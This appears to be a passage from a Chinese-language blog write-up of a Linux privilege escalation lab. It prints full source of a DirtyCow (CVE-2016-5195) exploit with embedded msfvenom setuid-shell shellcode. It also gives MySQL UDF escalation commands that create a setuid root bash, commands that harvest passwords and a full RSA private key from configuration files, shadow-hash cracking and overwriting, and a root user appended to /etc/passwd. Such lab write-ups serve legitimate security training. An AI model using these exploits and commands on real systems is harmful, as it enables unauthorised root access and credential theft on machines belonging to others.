class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/kernel-exploits$ cat /home/user/tools/kernel-exploits/dirtycow/c0w.c</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* A PTRACE_POKEDATA variant of CVE-2016-5195</span></span><br><span class="line"><span class="comment">* should work on RHEL 5 &amp; 6</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* (un)comment correct payload (x86 or x64)!</span></span><br><span class="line"><span class="comment">* $ gcc -pthread c0w.c  -o c0w</span></span><br><span class="line"><span class="comment">* $ ./c0w</span></span><br><span class="line"><span class="comment">* DirtyCow root privilege escalation</span></span><br><span class="line"><span class="comment">* Backing up /usr/bin/passwd.. to /tmp/bak</span></span><br><span class="line"><span class="comment">* mmap fa65a000</span></span><br><span class="line"><span class="comment">* madvise 0</span></span><br><span class="line"><span class="comment">* ptrace 0</span></span><br><span class="line"><span class="comment">* $ /usr/bin/passwd </span></span><br><span class="line"><span class="comment">* [root@server foo]# whoami </span></span><br><span class="line"><span class="comment">* root</span></span><br><span class="line"><span class="comment">* [root@server foo]# id</span></span><br><span class="line"><span class="comment">* uid=0(root) gid=501(foo) groups=501(foo)</span></span><br><span class="line"><span class="comment">* @KrE80r</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// change if no permissions to read</span></span><br><span class="line"><span class="keyword">char</span> suid_binary[] = <span class="string">&quot;/usr/bin/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shell_code[] = &#123;</span><br><span class="line">  <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xb1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xea</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>,</span><br><span class="line">  <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sc_len = <span class="number">177</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i</span></span><br><span class="line"><span class="comment">unsigned char shell_code[] = &#123;</span></span><br><span class="line"><span class="comment">  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,</span></span><br><span class="line"><span class="comment">  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,</span></span><br><span class="line"><span class="comment">  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,</span></span><br><span class="line"><span class="comment">  0x89, 0xe1, 0xcd, 0x80</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">unsigned int sc_len = 136;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">200000000</span>;i++)</span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                                \n\</span></span><br><span class="line"><span class="string">   (___)                                   \n\</span></span><br><span class="line"><span class="string">   (o o)_____/                             \n\</span></span><br><span class="line"><span class="string">    @@ `     \\                            \n\</span></span><br><span class="line"><span class="string">     \\ ____, /%s                          \n\</span></span><br><span class="line"><span class="string">     //    //                              \n\</span></span><br><span class="line"><span class="string">    ^^    ^^                               \n\</span></span><br><span class="line"><span class="string">&quot;</span>, suid_binary);</span><br><span class="line">  <span class="keyword">char</span> *backup;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;DirtyCow root privilege escalation\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Backing up %s to /tmp/bak\n&quot;</span>, suid_binary);</span><br><span class="line">  asprintf(&amp;backup, <span class="string">&quot;cp %s /tmp/bak&quot;</span>, suid_binary);</span><br><span class="line">  system(backup);</span><br><span class="line"></span><br><span class="line">  f=open(suid_binary,O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size+<span class="keyword">sizeof</span>(<span class="keyword">long</span>),PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %x\n\n&quot;</span>,<span class="built_in">map</span>);</span><br><span class="line">  pid=fork();</span><br><span class="line">  <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">    waitpid(pid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u,i,o,c=<span class="number">0</span>,l=sc_len;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10000</span>/l;i++)</span><br><span class="line">      <span class="keyword">for</span>(o=<span class="number">0</span>;o&lt;l;o++)</span><br><span class="line">        <span class="keyword">for</span>(u=<span class="number">0</span>;u&lt;<span class="number">10000</span>;u++)</span><br><span class="line">          c+=ptrace(PTRACE_POKETEXT,pid,<span class="built_in">map</span>+o,*((<span class="keyword">long</span>*)(shell_code+o)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n\n&quot;</span>,c);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(),SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/faae7eb947602f5192ad9fbdec6c3652.png" alt="image-20220519152241925"></p><hr><h3 id="4-服务提权"><a href="#4-服务提权" class="headerlink" title="#4 服务提权"></a>#4 服务提权</h3><ul><li>Mysql UDF提权：<a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&quot;secure%&quot;</span>;<span class="comment">#查看是否有上传权限</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |<span class="comment">#secure_file_priv值需要为空</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ searchsploit -m 1518  <span class="comment">#获取exp</span></span><br><span class="line">$ mv 1518.c raptor_udf2.c<span class="comment">#重命名</span></span><br><span class="line">$ gcc -g -c raptor_udf2.c<span class="comment">#编译</span></span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"></span><br><span class="line">$ mysql -u root -p<span class="comment">#登录Mysql</span></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/user/tools/mysql-udf/raptor_udf2.so&#x27;</span>));<span class="comment">#记得修改路径</span></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);</span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br><span class="line">$ /tmp/rootbash -p<span class="comment">#退出mysql后执行命令</span></span><br><span class="line"></span><br><span class="line">rootbash-4.1<span class="comment"># id</span></span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">rm /tmp/rootbash  <span class="comment">#请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="5-密码-amp-密钥"><a href="#5-密码-amp-密钥" class="headerlink" title="#5 密码&amp;密钥"></a>#5 密码&amp;密钥</h3><ul><li> 历史命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/.*<span class="built_in">history</span></span><br></pre></td></tr></table></figure><ul><li> 配置文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /home/user/myvpn.ovpn</span><br><span class="line">client</span><br><span class="line">......</span><br><span class="line">remote-cert-tls server</span><br><span class="line">auth-user-pass /etc/openvpn/auth.txt<span class="comment">#包含密码txt文件</span></span><br><span class="line">comp-lzo</span><br><span class="line">verb 1</span><br><span class="line">reneg-sec 0</span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /etc/openvpn/auth.txt</span><br><span class="line">root</span><br><span class="line">password123<span class="comment">#获取密码</span></span><br></pre></td></tr></table></figure><ul><li> SSH密钥    (藏在根目录)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls  -la /.ssh</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 Aug 25  2019 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Aug 25  2019 ..</span><br><span class="line">-rw-r--r--  1 root root 1679 Aug 25  2019 root_key</span><br><span class="line">user@debian:~$ cat /.ssh/root_key </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm</span><br><span class="line">gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl</span><br><span class="line">p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo</span><br><span class="line">OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD</span><br><span class="line">eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET</span><br><span class="line">Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2</span><br><span class="line">NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ</span><br><span class="line">YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+</span><br><span class="line">5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el</span><br><span class="line">WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7</span><br><span class="line">VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7</span><br><span class="line">6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW</span><br><span class="line">1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K</span><br><span class="line">824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6</span><br><span class="line">Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc</span><br><span class="line">U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1</span><br><span class="line">Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi</span><br><span class="line">SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV</span><br><span class="line">d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im</span><br><span class="line">jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa</span><br><span class="line">871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok</span><br><span class="line">X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4</span><br><span class="line">CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN</span><br><span class="line">Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4</span><br><span class="line">LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">$ chmod 600 root_key</span><br><span class="line">$ ssh -i root_key root@10.10.63.222</span><br></pre></td></tr></table></figure><ul><li>查找/etc下的密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line">grep -r password</span><br></pre></td></tr></table></figure><hr><h3 id="6-弱文件权限"><a href="#6-弱文件权限" class="headerlink" title="#6 弱文件权限"></a>#6 弱文件权限</h3><ul><li>shadow文件可读可写</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#破解hash</span></span><br><span class="line">$ ls -l /etc/shadow</span><br><span class="line">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow<span class="comment">#文件可读可写</span></span><br><span class="line"></span><br><span class="line">$ cat /etc/shadow</span><br><span class="line">root:$6<span class="variable">$Tb</span>/euwmK<span class="variable">$OXA</span>.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</span><br><span class="line">daemon:*:17298:0:99999:7:::</span><br><span class="line">bin:*:17298:0:99999:7:::</span><br><span class="line"></span><br><span class="line">$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入hash</span></span><br><span class="line">$ mkpasswd -m sha-512 123456</span><br><span class="line">$6<span class="variable">$G770c2Pp4gpik</span>//c<span class="variable">$3m2qme9asqkg5lJ1DNX9YcGitn6Ek7r6IKsWEF8</span>.Z8N8SJctCdbaTxs1Fcvvqzy/QrQ3TOJIA9KzK9Mf8qBVm/</span><br><span class="line">$ nano /etc/shadow</span><br><span class="line">$ su root</span><br></pre></td></tr></table></figure><ul><li>可写/etc/passwd<ul><li>用户名:密码:UID:GID:用户信息:家目录:命令/shell</li><li>test:X:0:0:root:/root:/bin/bash</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ openssl passwd -1 -salt [salt] [password]</span><br><span class="line">$ openssl passwd -1 -salt new 123</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd     <span class="comment">#注意$符需要转义</span></span><br></pre></td></tr></table></figure><hr><h3 id="7-定时任务"><a href="#7-定时任务" class="headerlink" title="#7 定时任务"></a>#7 定时任务</h3><p><strong>1. 定时文件可编辑</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span 